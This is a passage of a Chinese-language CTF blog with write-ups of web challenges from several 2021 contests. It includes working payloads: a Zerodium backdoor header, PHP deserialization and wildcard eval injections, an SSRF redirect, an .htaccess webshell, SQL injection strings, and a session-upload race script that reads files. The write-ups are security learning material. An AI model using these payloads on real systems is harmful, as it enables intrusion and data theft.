<pre><code class="language-demo" data-lang="demo">User-agentt:Zerodiumsystem('cat /flag');
</code></pre><h3 id="unsetme">unsetme</h3>
<p>搜了一下是<code>fatfree</code>框架，上github把源码下了下来，把index.php换成题目。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1">// Kickstart the framework
</span><span class="c1"></span><span class="nv">$f3</span><span class="o">=</span><span class="k">require</span><span class="p">(</span><span class="s1">&#39;lib/base.php&#39;</span><span class="p">);</span>

<span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="k">if</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nx">PCRE_VERSION</span><span class="o">&lt;</span><span class="mf">8.0</span><span class="p">)</span>
    <span class="nx">trigger_error</span><span class="p">(</span><span class="s1">&#39;PCRE version is out of date&#39;</span><span class="p">);</span>

<span class="c1">// Load configuration
</span><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
<span class="nx">unset</span><span class="p">(</span><span class="nv">$f3</span><span class="o">-&gt;</span><span class="nv">$a</span><span class="p">);</span>

<span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span> 
</code></pre></div><p>运行发现<code>base.php</code>中的一个<code>eval()</code>函数有报错，我们跟进看一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-1877951853.png" alt=""></p>
<p>函数调用应该是这里，我们在在前面加上一个<code>var_dump('unset('.$val.');');</code>,用于调试。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3769891392.png" alt=""></p>
<p>有了输出就好说，看能不能把括号闭合一下。
测试发现要关闭<code>)</code>,得先关闭<code>]</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3079279328.png" alt=""></p>
<p>后面就是命令执行拿flag了。</p>
<h2 id="0x05-蓝帽杯">0x05 蓝帽杯</h2>
<h3 id="one-pointer-php-">One Pointer PHP ×</h3>
<p><a href="https://theoyu.top/posts/bluehat/">蓝帽杯 One Pointer PHP</a></p>
<p>质量很高的一题。</p>
<h2 id="0x06-津门杯">0x06 津门杯</h2>
<h3 id="power_cut">power_cut</h3>
<p>根据提示，下载<strong>swp</strong> 文件， <code>vim -r </code>得到源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">logger</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$logFile</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$initMsg</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$exitMsg</span><span class="p">;</span>
  
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
        <span class="c1">// initialise variables
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&#34;#--session started--#</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span><span class="s2">&#34;#--session end--#</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span>  <span class="nv">$file</span><span class="p">;</span>
        <span class="nx">readfile</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">);</span>
        
    <span class="p">}</span>
  
    <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$msg</span><span class="p">){</span>
        <span class="nv">$fd</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">);</span>
        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$msg</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
    <span class="p">}</span>
  
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">&#34;this is destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">weblog</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$weblogfile</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
    	<span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;system(&#39;cat /flag&#39;)&#34;</span><span class="p">;</span>
    	<span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="c1">// self::waf($this-&gt;filepath);
</span><span class="c1"></span>        <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">logger</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">weblogfile</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
        <span class="nv">$str</span><span class="o">=</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[&lt;&gt;*#&#39;|?</span><span class="se">\n</span><span class="s2"> ]/&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
        <span class="nv">$str</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">&#34;this is destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="nv">$log</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;log&#39;</span><span class="p">];</span>
<span class="nv">$log</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[&lt;&gt;*#&#39;|?</span><span class="se">\n</span><span class="s2"> ]/&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$log</span><span class="p">);</span>
<span class="nv">$log</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$log</span><span class="p">);</span>
<span class="nv">$log_unser</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$log</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="err">
</span><span class="err">
</span><span class="err">&lt;html&gt;
</span><span class="err">&lt;body&gt;
</span><span class="err">&lt;p&gt;&lt;br/&gt;昨天晚上因为14级大风停电了.&lt;/p&gt;
</span><span class="err">&lt;/body&gt;
</span><span class="err">&lt;/html&gt;
</span></code></pre></div><p>第一看看到<strong>weblog</strong>中的<code>cat /flag</code>，马上就构造了一个<strong>logger</strong>对象去创建一个<strong>weblog</strong>实例，然后发现是假输出&hellip;那就是用<strong>readfile</strong>去打了，这里对flag有过滤，双写或者大写S绕过都可以。</p>
<p><code>?log=O:6:&quot;weblog&quot;:1:{s:10:&quot;weblogfile&quot;;S:5:&quot;/\66lag&quot;;}</code></p>
<h3 id="hate_php">hate_php</h3>
<p>源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9_$@]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fighting!&#39;</span><span class="p">);</span> 
    <span class="p">}</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>看过p神文章的话对这题肯定不陌生，过滤了**$**的话，那能考虑的差不多只有取反和通配符匹配了。</p>
<p>但取反的话，类似<code>~%8F%97%8F%96%91%99%90.()</code>在php5中是不可取的，因为其不支持这样调用动态函数的方法，那能考虑的只有通配符了。</p>
<pre><code class="language-url" data-lang="url">?code=?&gt;&lt;?=`/???/??? /????.???`?&gt; elf文件 没看见flag
</code></pre><p>然后看到一篇POST传输临时文件，然后匹配/tmp/php??????去执行反弹shell，但试了很多次都不行，最后&hellip;</p>
<pre><code class="language-url" data-lang="url">?code=?&gt;&lt;?=`/???/??? /????`?&gt; 又居然ok了淦
</code></pre><p>原来是送分题，是我想多了，不过临时文件的方法后续还可以学习学习。</p>
<h3 id="gooss">GoOSS</h3>
<p>gin框架的ssrf,还比较有意思。</p>
<p>拿到代码审一下<code>fileMidderware</code>这个中间件有点奇怪。</p>
<div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="k">if</span> <span class="nx">fi</span><span class="p">.</span><span class="nf">IsDir</span><span class="p">()</span> <span class="p">{</span>
		
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Request</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span>

		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">HasSuffix</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Request</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="s">&#34;/&#34;</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">c</span><span class="p">.</span><span class="nf">Redirect</span><span class="p">(</span><span class="mi">302</span><span class="p">,</span><span class="nx">c</span><span class="p">.</span><span class="nx">Request</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span><span class="o">+</span><span class="s">&#34;/&#34;</span><span class="p">)</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nx">files</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">string</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
			<span class="nx">l</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Readdir</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
			<span class="k">for</span> <span class="nx">_</span><span class="p">,</span><span class="nx">i</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">l</span> <span class="p">{</span>
				<span class="nx">files</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">files</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
			<span class="p">}</span>

			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span> <span class="nx">gin</span><span class="p">.</span><span class="nx">H</span><span class="p">{</span>
				<span class="s">&#34;files&#34;</span> <span class="p">:</span><span class="nx">files</span><span class="p">,</span>
			<span class="p">})</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></div><p>如果<code>url</code>参数后缀不是<code>/</code>的话，就会发生302跳转，这里我们加一个后缀为..即可。</p>
<p>但本地测试的适合一直没有发生302跳转：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223815266.png" alt="image-20210511223815266"></p>
<p>带上<code>//</code>后成功了，才想起来<code>//</code>就是省略HTTP协议的写法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223837295.png" alt="image-20210511223837295"></p>
<p>再回到题目，我们直接可以通过这个特性访问内网80端口，传参readfile，但不知道为什么一直读不到flag&hellip;</p>
<p>然后换一个思路，在自己的vps上面传</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: http://127.0.0.1/index.php?file=/flag&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>然后直接<code>{&quot;url&quot;=&quot;https://127.0.0.1:1234//ip/..&quot;}</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511224859453.png" alt="image-20210511224859453"></p>
<p>后来看师傅们的wp，打本地也是ok的，不过不知道为什么不能直接读<code>/flag</code>,还得从传参一层一层读..</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511225539813.png" alt="image-20210511225539813"></p>
<h3 id="uploadhub-">UploadHub ×</h3>
<p>很离谱，明明是白名单上传，但是好像变成了任意文件上传</p>
<p>配置文件上有</p>
<div class="highlight"><pre class="chroma"><code class="language-ini" data-lang="ini"><span class="na">&lt;Directory ~ &#34;/var/www/html/upload/[a-f0-9]{32}/&#34;&gt;</span>
        <span class="na">php_flag engine off</span>
<span class="na">&lt;/Directory&gt;</span>
</code></pre></div><p>看了几种打法，但一打上去就无法访问网站，或者连接失败。</p>
<p>师傅wp:</p>
<pre><code>&lt;Files .htaccess&gt;
SetHandler application/x-httpd-php
Require all granted
php_flag engine on
&lt;/Files&gt;
#&lt;?php eval($_REQUEST['theoyu'])?&gt;
</code></pre><p>我记得我之前用过这种类似的，但是不行，试了一次果然还是不行&hellip;奇奇怪怪</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511233114244.png" alt="image-20210511233114244"></p>
<p><strong>后续补充</strong>:在buu上重新做了一下这道题，原封不动的打法成功了,但是马很快会被删掉，而且<code>disable_funciton</code>禁用很多，不过直接用<code>file_get_contens()</code>读 <strong>/flag</strong>即可。</p>
<h2 id="0x07-ciscn-初赛">0x07 ciscn 初赛</h2>
<p>感觉web质量还不错，可以接受范围。</p>
<h3 id="easy_sql">easy_sql</h3>
<p>先用sqlmap跑一下，发现表名和列名，但flag表只有一个id，而且只有一个1。</p>
<pre><code>python2 .\sqlmap.py -r .\ctf.txt -D security -T flag -C &quot;cb01f2dd-b7ea-458c-a300-93e0607b183a&quot; --dump
</code></pre><p>然后报错注入的方法也可以跑出来，无列名注入，得到flag。</p>
<pre><code>passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,database()))-- -
passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,(select * from (select * from flag a join flag b using(id,no))c)))-- -
</code></pre><h3 id="easy_source">easy_source</h3>
<p>源码文件地址<code>.index.php.swo</code></p>
<p>源码比较长，就不放了，看到代码马上想到了之前DASCTF原生类读取，但<code>SplFileObject</code>只能按行读取，要想读全部的话得用<code>foreach</code>遍历，不太行。</p>
<p>后来发现是原题&hellip;实在没想到，flag藏在注释里，直接用<code>ReflectionMethod</code>原生类去一个一个读函数注解即可。</p>
<p><strong>后续补充</strong>：在看博客的时候，发现羽师傅用的就是<code>splFileObject</code>的方法，手册里面写有：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-18-image-20210518202515518.png" alt="image-20210518202515518"></p>
<p>再调用<code>fpassthru</code>就可以输出全部文件内容，送自己一句：<strong>Read The Fucking Manual</strong>！</p>
<h3 id="middle_source">middle_source</h3>
<p>目录扫描，得到<code>.listing</code>，里面有 <code>phpinfo()</code>位置，然后通过SESSION LFI GetShell即可。</p>
<p><img src="https://gitee.com/lcdm123/image/raw/master/2021-05-15-image-20210515212934339.png" alt="image-20210515212934339"></p>
<p><code>disable_function</code>禁用了很多函数，用蓝帽杯那题的思路就行(多做题还是好XD)</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">io</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="n">sessid</span> <span class="o">=</span> <span class="s1">&#39;Theoyu&#39;</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;cf&#34;</span><span class="p">:</span><span class="s1">&#39;../../../../var/lib/php/sessions/gcbejhehdh/sess_&#39;</span><span class="o">+</span><span class="n">sessid</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
        <span class="c1"># resp = session.post( &#39;http://124.70.28.149:20877/&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php $a = new DirectoryIterator(&#34;glob:///etc/aebgjbecbg/abhiabddfd/hafjgahhef/debibfeahf/bibciiadie/fl444444g/*&#34;);foreach($a as $f){echo($f-&gt;__toString().&#34;\n&#34;);}?&gt;&#39;}, files={&#39;file&#39;: (&#39;test.txt&#39;,f)}, cookies={&#39;PHPSESSID&#39;: sessid} )</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span> <span class="s1">&#39;http://124.70.28.149:20877/&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php  var_dump(file_get_contents(&#34;/etc/aebgjbecbg/abhiabddfd/hafjgahhef/debibfeahf/bibciiadie/fl444444g&#34;)); ?&gt;&#39;</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span><span class="n">f</span><span class="p">)},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}</span> <span class="p">)</span>
<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>  
    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://124.70.28.149:20877/&#39;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="c1">#print(resp.text)</span>
    <span class="k">if</span> <span class="s1">&#39;test.txt&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;[+++++++++++++]retry&#34;</span><span class="p">)</span>
<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span> 
            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-15-image-20210515213117458.png" alt="image-20210515213117458"></p>
<h3 id="upload-">upload ×</h3>
<p>初始路由是一个上传页面</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;upload&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这么大个的东西你是想d我吗？&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;如果不能好好传图片的话就还是不要来打扰我了&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;东西不能方方正正的话就很讨厌&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;ph&#34;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;有些东西让你传上去的话那可不得了&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$imagePath</span> <span class="o">=</span> <span class="s2">&#34;image/&#34;</span> <span class="o">.</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;postedFile&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$imagePath</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;upload success, image at </span><span class="si">$imagePath</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;传都没有传上去&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p><code>example.php</code>下应该是对zip的解压缩。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;poc&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\ZipArchive</span><span class="p">();</span>
    <span class="nv">$name_for_zip</span> <span class="o">=</span> <span class="s2">&#34;example/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">)[</span><span class="nx">count</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;zip&#34;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;要不咱们再看看？&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span> <span class="p">(</span><span class="s2">&#34;都不能解压呢&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">echo</span> <span class="s2">&#34;可以解压，我想想存哪里&#34;</span><span class="p">;</span>
